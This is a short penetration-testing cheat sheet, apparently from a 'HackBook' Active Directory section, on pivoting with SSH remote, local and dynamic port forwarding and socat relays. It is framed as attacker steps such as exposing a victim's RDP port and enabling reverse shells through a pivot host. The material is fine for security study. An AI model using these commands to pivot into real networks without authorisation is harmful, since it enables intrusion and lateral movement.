# SSH Tunnelling:
  ## SSH Remote Port Forwarding:
  - **Remote port forwarding allows you to take a reachable port from the SSH client and project it into a remote SSH server.**
  ![ssh rpf](https://github.com/Alikhoshkholgh/HackBook/blob/main/Windows-Environment/ActiveDirectory/zz-remote-SSH-portForwarding.png)
  
  ### Command:
  ```
  # attacker wants to see oprt:3389 from victim with pivot-machine. in the pivot-machine execute this command:
  ssh username@<attackerIP> -R <anything>:<victimIP>:3389 -N
  # now attacker can see the RDP from "localhost:<anything>"
  ```
  ## SSH Local Port Forwarding:
  - **Local port forwarding allows us to "pull" a port from an SSH server into the SSH client.**
  ![ssh lpf](https://github.com/Alikhoshkholgh/HackBook/blob/main/Windows-Environment/ActiveDirectory/zz-local-SSH-portforwarding.png)
  
  ### Command:
  ```
  #any host that can't connect directly to the attacker's PC but can connect to PC-1 will now be able to reach the attacker's services through the pivot host.
  #allow us to run reverse shells from hosts that normally wouldn't be able to connect back to us 
  ssh tunneluser@<att-IP> -L *:<port number to receive connections>:127.0.0.1:<port number from attacker machine that is listening and we want to pull it> -N
  ```

# Socat:
 ```
 socat TCP4-LISTEN:<PortNumber for incoming connections>,fork TCP4:<IP-forward to this>:<PortNumber-forward to this port>
 ```
 
 
 # Dynamic Port Forwarding and SOCKS:
   - **what if you want to run a scan through a pivot host?**
   - **Command SSH**:
   ```
   # from pivot host run this to create SOCKS proxy listening on port <proxyPort> in the pivot host:
   ssh tunneluser@<attackerIP> -R <proxyPort> -N
   ```
 
 
